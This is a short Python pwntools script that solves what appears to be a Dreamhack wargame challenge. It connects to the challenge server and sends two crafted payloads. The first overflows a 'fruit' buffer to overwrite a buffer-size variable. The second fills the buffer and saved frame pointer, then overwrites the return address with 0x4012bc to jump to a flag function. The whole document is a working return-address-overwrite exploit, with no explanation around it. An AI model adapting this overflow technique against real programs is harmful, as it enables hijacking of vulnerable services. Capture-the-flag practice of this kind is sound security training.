from pwn import *

r = remote("host3.dreamhack.games", 17334)

flag = 0x4012bc

payload = b"cherry"
payload += b"A"*0x6 #fruit[0x6]
payload += b"B" #buf_size Overwrite

r.sendlineafter(b"Menu: ", payload)

payload2 = b"A"*0x12 #fruit buf
payload2 += b"B"*0x8 #sfp
payload2 += p64(flag)

r.sendlineafter(": ", payload2)
r.interactive()